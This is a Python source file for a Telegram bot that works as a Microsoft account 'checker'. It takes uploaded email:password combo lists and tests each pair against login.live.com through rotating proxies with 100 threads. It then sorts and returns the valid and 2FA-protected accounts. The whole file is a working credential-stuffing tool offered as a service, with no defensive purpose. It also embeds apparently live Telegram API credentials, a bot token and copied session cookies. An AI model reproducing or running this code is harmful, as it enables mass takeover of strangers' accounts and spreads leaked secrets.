from pyrogram import Client, filters
import os, json, time, logging, subprocess, shutil, re, glob, asyncio, unicodedata, uuid, threading, queue, random, urllib.parse, tempfile
import os, threading, random, time, re, requests, asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from rich.console import Console
import os
import threading
from rich.console import Console  # Console kullanıyorsan bu lazım

# ---------------------------- BOT SETTINGS ----------------------------
API_ID = 26843761
API_HASH = "d0ebfea34c3cdab94dabb1b36338f7d2"
BOT_TOKEN = "8497140725:AAE2YLSuXGYaKm4PxAe9P1uj085a118DJis"  # DİKKAT: Bunu public paylaşma normalde :)

BASE_DIR = "/app"  # Railway çalışma dizini

RESULTS_DIR = os.path.join(BASE_DIR, "results")
PROXY_FILE  = os.path.join(BASE_DIR, "proxy.txt")
USERS_FILE  = os.path.join(BASE_DIR, "users.json")  # users.json da /app içine gitsin

# Klasörü oluştur (yoksa hata verme)
os.makedirs(RESULTS_DIR, exist_ok=True)

# Global durumlar
user_states = {}
write_lock = threading.Lock()
console = Console()


#---------------------------- LOGGER ----------------------------
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("bot")

RESULT_SUFFIX = "_r3z1n.txt"
RESULT_DATESTAMP = True
RESULT_DATE_FMT  = "%Y-%m-%d"
RESULT_WRITE_MODE = "merge"  # "merge" | "overwrite"

# Concurrency
MAX_DISK_WORKERS   = max(4, (os.cpu_count() or 4))
SEARCH_CONCURRENCY = 4
search_sem = asyncio.Semaphore(SEARCH_CONCURRENCY)
thread_pool = ThreadPoolExecutor(max_workers=MAX_DISK_WORKERS)



# Pending queries (if needed later)
pending_queries = {}

# Dictionary to track user states, e.g., waiting for a file
user_states = {}

# --- Performance Optimizations ---
USERS_DATA_DIRTY = False # Flag to indicate if users data has changed
STATS_CACHE = {"data": None, "timestamp": 0}
STATS_CACHE_TTL_SEC = 300 # 5 minutes


# ---------------- USER SYSTEM ----------------
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            try:
                return json.load(f)
            except Exception:
                return {}
    return {}

def save_users():
    """Saves the users dictionary to the JSON file."""
    global USERS_DATA_DIRTY
    with open(USERS_FILE, "w", encoding="utf-8", newline="\n") as f:
        json.dump(users, f, indent=2, ensure_ascii=False)
    USERS_DATA_DIRTY = False
    logger.info("User data saved to disk.")

users = load_users()

def mark_users_dirty():
    global USERS_DATA_DIRTY; USERS_DATA_DIRTY = True
def get_user(user_id: int):
    uid = str(user_id)
    if uid not in users:
        users[uid] = {
            "plan": "free",

            "joined_at": None,
            "start_notified": False,
            "last_reset_day": None,
            "referred_by": None,
            "ref_count": 0
        }
        mark_users_dirty()
    return users[uid]

def add_tickets(user_id: int, n: int = 1):
    """
    Adds n tickets to a user.
    Returns (success: bool, new_ticket_count: int|None)
    """
    u = get_user(user_id)
    t = u.get("tickets", 0)
    if t is None:
        return False, None  # VIP unlimited
    try:
        u["tickets"] = max(0, int(t or 0) + int(n))
    except Exception:
        u["tickets"] = max(0, (int(t) if isinstance(t, int) else 0) + (int(n) if isinstance(n, int) else 0))
    mark_users_dirty()
    return True, u["tickets"]

def use_ticket(user_id: int, n: int = 1):
    u = get_user(user_id)
    t = u.get("tickets", 0)
    if t is None:
        return False, None  # VIP unlimited
    try:
        u["tickets"] = max(0, int(t or 0) - int(n))
    except Exception:
        u["tickets"] = max(0, (int(t) if isinstance(t, int) else 0) - (int(n) if isinstance(n, int) else 0))
    mark_users_dirty()
    return True, u["tickets"]

# ---------------- REFERRAL HELPERS ----------------
def build_ref_url(bot_username: str, user_id: int) -> str:
    return f"https://t.me/{bot_username}?start=ref_{user_id}"

def parse_start_payload(text: str) -> str | None:
    parts = (text or "").split(maxsplit=1)
    if len(parts) < 2:
        return None
    start_param = parts[1].strip()
    return start_param or None

def parse_owner_from_ref(start_param: str) -> int | None:
    # formats: "ref_12345" or "ref-12345"
    m = re.match(r"^ref[_\-](\d+)$", start_param.strip(), flags=re.IGNORECASE)
    if not m:
        return None
    try:
        return int(m.group(1))
    except Exception:
        return None

def apply_referral_ownerid(new_user_id: int, owner_id: int) -> bool:
    """
    /start ref_<owner_id>:
      - Self-referral is disabled.
      - Cannot re-assign if already referred_by.
      - If successful, the owner gets +1 ticket (does not increase for VIPs).
    """
    if not isinstance(owner_id, int) or owner_id <= 0:
        return False
    if owner_id == new_user_id:
        return False
    new_user = get_user(new_user_id)
    if new_user.get("referred_by") is not None:
        return False
    new_user["referred_by"] = owner_id
    mark_users_dirty()
    try:
        # Give +1 ticket to the owner
        owner_user = get_user(owner_id)
        add_tickets(owner_id, 1)  # Does not change if VIP
        owner_user["ref_count"] = int(owner_user.get("ref_count", 0)) + 1
        mark_users_dirty()
    except Exception:
        pass
    return True

#

# ===================== EXTERNAL CHECKERS =====================
class MicrosoftChecker:
    def __init__(self):
        """
        
        MicrosoftChecker Lib 1.0
        Mail Checkers
        Dev --> Not-ISellStuff
        
        """

        self.headersMICROSOFT = {"Content-Type": "application/x-www-form-urlencoded","Cookie": "MicrosoftApplicationsTelemetryDeviceId=920e613f-effa-4c29-8f33-9b639c3b321b; MSFPC=GUID=1760ade1dcf744b88cec3dccf0c07f0d&HASH=1760&LV=202311&V=4&LU=1701108908489; mkt=ar-SA; IgnoreCAW=1; MUID=251A1E31369E6D281AED0DE737986C36; MSCC=197.33.70.230-EG; MSPBack=0; NAP=V=1.9&E=1cca&C=sD-vxVi5jYeyeMkwVA7dKII2IAq8pRAa4DmVKHoqD1M-tyafuCSd4w&W=2; ANON=A=D086BC080C843D7172138ECBFFFFFFFF&E=1d24&W=2; SDIDC=CVbyEkUg8GuRPdWN!EPGwsoa25DdTij5DNeTOr4FqnHvLfbt1MrJg5xnnJzsh!HecLu5ZypjM!sZ5TtKN5sdEd2rZ9rugezwzlcUIDU5Szgq7yMLIVdfna8dg3sFCj!kQaXy2pwx6TFwJ7ar63EdVIz*Z3I3yVzEpbDMlVRweAFmG1M54fOyH0tdFaXs5Mk*7WyS05cUa*oiyMjqGmeFcnE7wutZ2INRl6ESPNMi8l98WUFK3*IKKZgUCfuaNm8lWfbBzoWBy9F3hgwe9*QM1yi41O*rE0U0!V4SpmrIPRSGT5yKcYSEDu7TJOO1XXctcPAq21yk*MnNVrYYfibqZvnzRMvTwoNBPBKzrM6*EKQd6RKQyJrKVdEAnErMFjh*JKgS35YauzHTacSRH6ocroAYtB0eXehx5rdp2UyG5kTnd8UqA00JYvp4r1lKkX4Tv9yUb3tZ5vR7JTQLhoQpSblC4zSaT9R5AgxKW3coeXxqkz0Lbpz!7l9qEjO*SdOm*5LBfF2NZSLeXlhol**kM3DFdLVyFogVq0gl0wR52Y02; MSPPre=imrozza%40outlook.com%7c8297dd0d702a14b0%7c%7c; MSPCID=8297dd0d702a14b0; MSPSoftVis=@:@; MSPRequ=id=N&lt=1701944501&co=0; uaid=a7afddfca5ea44a8a2ee1bba76040b3c; OParams=11O.DmVQflQtPeQAtoyExD*hjGXsJOLcnQHVlRoIaEDQfzrgMX2Lpzfa992qCQeIn0O8kdrgRfMm1kEmcXgJqSTERtHj0vlp9lkdMHHCEwZiLEOtxzmks55h!6RupAnHQKeVfVEKbzcTLMei4RMeW1drXQ0BepPQN*WgCK3ua!f6htixcJYNtwumc8f29KYtizlqh0lqQ3a2dZ4Kd!KDOneLTE512ScqObfQd5AGBu*xLbcRbg6xqh1eWCOXW!JOT6defiMqxBGPNL1kQUYgc5WAG8tmjMPFLqVn1*f4xws1NDhwmYOHPu!rS9dn*trC71knxMAfi5Tt69XZHdojgnuopBag*YM7uIBrhUyfxjR*4Zkyygfax9gMaxxG9KScOnPvemNY1ZfVH9Vm!IxQFKoPoKBdLVH5Jc7Eokycow31oq7vNcAbi!cS3Wby0LjzBdr8jq2Aqj3RlWfckJaRoReZ4nY34Gh*eVllAMrF*VQP1iQ7t*I28266q6OQGZ9Y1q53Ai72b!8H5wjQJIJw1XV4zwRO8J02gt6vIPpLBFiq!7IkawEubBPpynkQ3neDo92Tpc71Y*WrnD6H8ojgzxRAj!DIiyfyA7kJHJ7DU!XSg*Xo0L1!DRYSBV!PKwNM7MaBiqsKbRWFnFyzKhBACfiPe8dK5ZUGBSpFbUlpXkUJOb247ewTWAsl9D4G6mezVjGY1u9uOYUPc3ZqTEBFRf4TK94CllbiMRC0v26W*qlwOl0SSpBufo8MtOUqvowUFqEWDDVl9WFV5bT2zZVUy4kPj9a*3YNnskgZghnOCtQYKIIRdFTWgL*DcbQ4XRL8hMisBDjyniS16W2P!1FH0dT12w7RlsJCdotQSK1WppX8sGWNrPrYNcih5ErXVZtYKbqrZLw2EcyGmkp7NxBHFUQXx*1tZSEeiWoZ5BrHSiEB7X2gB7BQDP7RbVYZS5UXeNp3rlGdN*5!nUGK3Fltm1sKFmtZU!T1Q0WaeFwVvpFYSCxg9uw6CC!va2dB*R6NFK!3GNBDrCvbXnJMaKVb!UoBP5G*GASdPnuJgb3cjUE*DIYMJRrPT!dZoHd5BAQSF3vBoPZasphWeflxXFMPBi055OBEawIzxOqS6Wn3IZCp3dgk8QLNssATkzwZvpUM5lSq710QTMZWENDKp5gTIlWcdYpKG1d8TmRlqXRJN7bdUuRIoehIWqnfSuJxGoNk6PM3x3!gMaxPxe1Ch6hMmsagHM8fFQ!MpP0TQ9nsIxh1goCaL*PbHDyj1U3btyu2RXibwIwgV1h5A6DgwmgbaH1Hn9LpdLipiT5fGiRbI903!wYUA3MgQg98OH9BQaJPXte1YpL8iUjUA9MreaZTQ5P13cUiNYrkTW2jVr5PTpEJvwpg*8piWEo9k*IzOCr6iKMRiZwTft*QYEEaKxbyvgLG*s33uhCN46R9J1VwPufzsxyGUHYyE5S1mhx8sWxw!pndIQ!RgVEsDfzvOO0H2P1hBGQG8npJ18th2WKYrvouqHZfRBcEc77hsbXUKec2lv4ETHag0RdrT6kFn03RDX*p*Hac*nugVJK1j0GouxkITbOmMjb8cpau*Lf*xNBUFc3roCuPjEpAcR48X51rIGpOjhAe56Q6CbwIuVe*z*KmRptzngkT4!AB*FGGKh2lOi6b0qR1w4Aia2g1pfjJU2G1r*Q!kSNxYtGn0WOkHiVkhAXQCvkNFp3q!ivZs3obM!0ffg$$; ai_session=6FvJma4ss/5jbM3ZARR4JM|1701943445431|1701944504493; MSPOK=$uuid-d9559e5d-eb3c-4862-aefb-702fdaaf8c62$uuid-d48f3872-ff6f-457e-acde-969d16a38c95$uuid-c227e203-c0b0-411f-9e65-01165bcbc281$uuid-98f882b7-0037-4de4-8f58-c8db795010f1$uuid-0454a175-8868-4a70-9822-8e509836a4ef$uuid-ce4db8a3-c655-4677-a457-c0b7ff81a02f$uuid-160e65e0-7703-4950-9154-67fd0829b36","Origin": "https://login.live.com","Referer": "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJpZCI6IjAzZDZhYmM1NDIzMjQ2Yjg5MWNhYmM2ODg0ZGNmMGMzIn0%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",}
        self.failMICROSOFT = ['That Microsoft account doesn\'t exist. Enter a different account']
        self.retryMICROSOFT = ["Too Many Requests"]
        self.nfaMICROSOFT = [ 'account.live.com/recover?mkt', 'account.live.com/identity/confirm?mkt', '', '', '', '', '', '', '',]
        self.hitsMICROSOFT = ['https://login.live.com/oauth20_desktop.srf?', 'WLSSC', 'sSigninName']

    def found(self, keywords, resp):
        for keyword in keywords:
            if keyword in resp:
                return True
        return False

    # ----------------------------------------------------- #

    def payloadMICROSOFT(self, email, password):
        payload = {
            "i13": "0",
            "login": email,
            "loginfmt": email,
            "type": "11",
            "LoginOptions": "3",
            "lrt": "",
            "lrtPartition": "",
            "hisRegion": "",
            "hisScaleUnit": "",
            "passwd": password,
            "ps": "2",
            "psRNGCDefaultType": "1",
            "psRNGCEntropy": "",
            "psRNGCSLK": "-DiygW3nqox0vvJ7dW44rE5gtFMCs15qempbazLM7SFt8rqzFPYiz07lngjQhCSJAvR432cnbv6uaSwnrXQ*RzFyhsGXlLUErzLrdZpblzzJQawycvgHoIN2D6CUMD9qwoIgR*vIcvH3ARmKp1m44JQ6VmC6jLndxQadyaLe8Tb!ZLz59Te6lw6PshEEM54ry8FL2VM6aH5HPUv94uacHz!qunRagNYaNJax7vItu5KjQ",
            "canary": "",
            "ctx": "",
            "hpgrequestid": "",
            "PPFT": "-DjzN1eKq4VUaibJxOt7gxnW7oAY0R7jEm4DZ2KO3NyQh!VlvUxESE5N3*8O*fHxztUSA7UxqAc*jZ*hb9kvQ2F!iENLKBr0YC3T7a5RxFF7xUXJ7SyhDPND0W3rT1l7jl3pbUIO5v1LpacgUeHVyIRaVxaGUg*bQJSGeVs10gpBZx3SPwGatPXcPCofS!R7P0Q$$",
            "PPSX": "Passp",
            "NewUser": "1",
            "FoundMSAs": "",
            "fspost": "0",
            "i21": "0",
            "CookieDisclosure": "0",
            "IsFidoSupported": "1",
            "isSignupPost": "0",
            "isRecoveryAttemptPost": "0",
            "i19": "21648"
        }

        return payload

    def loginMICROSOFT(self, email, password, proxy):
        session = requests.Session()
        url = "https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216"
        payload = self.payloadMICROSOFT(email, password)
        timeout = 20 if proxy else 10
        
        try:
            r = session.post(url, headers=self.headersMICROSOFT, data=payload, timeout=timeout, proxies=proxy)
            r.raise_for_status() # Raise an exception for bad status codes (4xx or 5xx)

            if self.found(self.hitsMICROSOFT, r.text):
                return ["hit", r.cookies.get("X-OWA-CANARY")]

            if self.found(self.nfaMICROSOFT, r.text):
                return ["nfa"]
            
            if self.found(self.failMICROSOFT, r.text):
                return ["fail"]

            if self.found(self.retryMICROSOFT, r.text):
                return ["retry"]
            
            # If no specific keyword is found, default to retry
            return ["retry"]

        except (requests.exceptions.RequestException, requests.exceptions.HTTPError) as e:
            # This will catch connection errors, timeouts, proxy errors, and bad HTTP statuses
            return ["retry"]

    # ----------------------------------------------------- #

mail = MicrosoftChecker()
write_lock = threading.Lock()
console = Console()
# ---------------------------- BOT COMMANDS ----------------------------
app = Client("TomLogBot_checker_session", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

async def _validate_document(message, user_id):
    """
    Validates the received document for type and size.
    Returns the document object if valid, otherwise None.
    """
    # Check if the user is supposed to be sending a file
    state_data = user_states.get(user_id)
    if not isinstance(state_data, dict) or state_data.get("state") != "awaiting_combo_file":
        await message.reply("Please use the /check command first to start a new checking process.")
        return None

    doc = message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        user_states.pop(user_id, None) # Reset state on validation failure
        await message.reply("❌ Invalid file type. Please send a `.txt` file.")
        return None

    # Check file size (bB limit)
    if doc.file_size > 30 * 1024 * 1024:
        await message.reply("❌ File is too large. The maximum allowed size is 30MB.")
        user_states.pop(user_id, None)  # Reset state on validation failure
        return None

    return doc

async def _read_combo_file(client, message, user_id):
    """
    Downloads and reads the combo file.
    Returns a list of lines if successful, otherwise None.
    """
    status_msg = await message.reply("Downloading file...")
    temp_combo_path = None
    try:
        temp_combo_path = await client.download_media(message, file_name=f"combos_{user_id}.txt")
        await status_msg.edit_text("File downloaded. Reading combos...")

        with open(temp_combo_path, "r", errors="ignore") as f:
            combo_lines = f.readlines()

        if not combo_lines:
            await status_msg.edit_text("❌ The file is empty. Please send a file with combos.")
            return None

        await status_msg.delete()
        return combo_lines
    finally:
        if temp_combo_path and os.path.exists(temp_combo_path):
            os.remove(temp_combo_path)


# ---------------- COMMAND: /start (with referral support) ----------------
@app.on_message(filters.command("start"))
async def start_handler(client, message):
    await message.reply(
        "Hello! I am the Microsoft Checker Bot.\n\n"
        "You can send your account list as a `.txt` file to check it.\n\n"
        "**Commands:**\n"
        "/check - Starts a new checking process.\n"
        "/cancel - Cancels the current operation."
    )

# ---------------- COMMAND: /check (for file upload) ----------------
@app.on_message(filters.command("check") & filters.private)
async def check_command_handler(client, message):
    user_id = message.from_user.id

    # Check if user is already in a process
    if user_states.get(user_id):
        await message.reply("You are already in the middle of a process. Please complete or cancel it first.")
        return

    # Set user state to waiting for combo file with a timestamp
    user_states[user_id] = {"state": "awaiting_combo_file", "timestamp": time.time()}
    await message.reply(
        "Please send your combo file (`.txt`) to start checking.\n"
        "**Note:** The maximum file size is 10MB."
    )

@app.on_message(filters.command("cancel") & filters.private)
async def cancel_command_handler(client, message):
    user_id = message.from_user.id

    # Check if the user is in a state that can be canceled
    if user_states.pop(user_id, None):
        # If pop returns a value, it means the user was in a state.
        await message.reply("✅ The current process has been canceled. You can start a new one with /check.")
    else:
        # If pop returns None, the user was not in any state.
        await message.reply("ℹ️ There is no active process to cancel.")

def process_combo_line(line, proxy):
    """Helper function to process a single combo line."""
    email_match = re.search(r'[\w\.-]+@[\w\.-]+', line)
    if not email_match:
        return "fail", line.strip()
    
    email = email_match.group(0)
    # Assume password is the rest of the line after the email and a separator
    password_part = line[email_match.end():].strip()
    if password_part.startswith((':', '|', ';')):
        password = password_part[1:].strip()
    else:
        password = password_part

    if not password:
        return "fail", line.strip()

    # Use the global 'mail' instance of the new checker
    result = mail.loginMICROSOFT(email, password, proxy)
    status = result[0] if result else "retry"
    return status, f"{email}:{password}"

async def run_checker_with_proxies(client, combo_lines, message):
    """
    Initializes and runs the checker process using proxies from the specified file.
    """
    user_id = message.from_user.id
    
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
    
    if not proxies:
        await message.reply("⚠️ Proxy file is empty or not found. Checking without proxies.")

    total_combos = len(combo_lines)
    results = {"hit": [], "nfa": [], "fail": [], "retry": []}
    total_checked, hit_count, nfa_count, bad_count, error_count = 0, 0, 0, 0, 0

    progress_msg_text = (
        f"🔍 **Checking...**\n\n"
        f"📧 Total: `{total_combos}`\n"
        f"✅ Hits: `{hit_count}`\n"
        f"🟨 2FA: `{nfa_count}`\n"
        f"❌ Bad: `{bad_count}`\n"
        f"⚠️ Errors: `{error_count}`\n\n"
        f"⏳ Progress: {total_checked}/{total_combos} (0.0%)"
    )
    progress_msg = await message.reply(progress_msg_text)

    with ThreadPoolExecutor(max_workers=100) as executor:
        future_to_line = {
            executor.submit(process_combo_line, line, {"http": f"http://{random.choice(proxies)}"} if proxies else None): line
            for line in combo_lines
        }
        for i, future in enumerate(as_completed(future_to_line), start=1):
            total_checked += 1
            try:
                status, combo = future.result()
                if status in results:
                    results[status].append(combo)
                if status == "hit": hit_count += 1
                elif status == "nfa": nfa_count += 1
                elif status == "fail": bad_count += 1
                else: error_count += 1 # 'retry' status
            except Exception:
                results["retry"].append(future_to_line[future].strip())
                error_count += 1
            
            if i % 20 == 0 or i == total_combos:
                percent = (i / total_combos) * 100
                text = (
                    f"🔍 **Checking...**\n\n"
                    f"📧 Total: `{total_combos}`\n"
                    f"✅ Hits: `{hit_count}`\n"
                    f"🟨 2FA: `{nfa_count}`\n"
                    f"❌ Bad: `{bad_count}`\n"
                    f"⚠️ Errors: `{error_count}`\n\n"
                    f"⏳ Progress: {i}/{total_combos} ({percent:.1f}%)"
                )
                try:
                    await progress_msg.edit_text(text)
                except Exception:
                    pass # Ignore flood wait errors

    await progress_msg.delete()

    # --- Save results to files ---
    user_results_dir = os.path.join(RESULTS_DIR, str(user_id))
    os.makedirs(user_results_dir, exist_ok=True)

    files_to_send = []
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    if results["hit"]:
        hit_filename = os.path.join(user_results_dir, f"valid_{timestamp}.txt")
        with open(hit_filename, "w", encoding="utf-8") as f:
            f.write("\n".join(results["hit"]))
        files_to_send.append(hit_filename)

    if results["nfa"]:
        nfa_filename = os.path.join(user_results_dir, f"nfa_{timestamp}.txt")
        with open(nfa_filename, "w", encoding="utf-8") as f:
            f.write("\n".join(results["nfa"]))
        files_to_send.append(nfa_filename)

    caption = (
        f"**✨ Check Complete! ✨**\n\n"
        f"✅ Valid: `{hit_count}`\n"
        f"ℹ️ 2FA/NFA: `{nfa_count}`\n"
        f"❌ Invalid: `{bad_count}`\n"
        f"🎯 Total Checked: `{total_checked}`\n\n"
        f"👑[OURCHANNEL](https://t.me/r3Z1N)"
    )

    if files_to_send:
        for i, file_path in enumerate(files_to_send):
             await client.send_document(chat_id=user_id, document=file_path, caption=caption if i == 0 else "")
    else:
        await message.reply(caption)
        

@app.on_message(filters.document & filters.private)
async def document_handler(client, message):
    user_id = message.from_user.id

    # 1. Validate the document and user state
    doc = await _validate_document(message, user_id)
    if not doc:
        return

    try:
        # 2. Download and read the file content
        combo_lines = await _read_combo_file(client, message, user_id)
        if not combo_lines:
            user_states.pop(user_id, None) # Reset state if file is empty
            return

        # 3. Run the checker process
        await run_checker_with_proxies(client, combo_lines, message)

        await message.reply("✅ Checking process complete! You can start a new one with /check.")
        
    except Exception as e:
        await message.reply(f"An error occurred: {e}")
    finally:
        # Reset user state regardless of outcome
        user_states.pop(user_id, None)

# ---------------------------- RUN ----------------------------
if __name__ == "__main__":
    print("BOT IS RUNNING...")
    app.run()
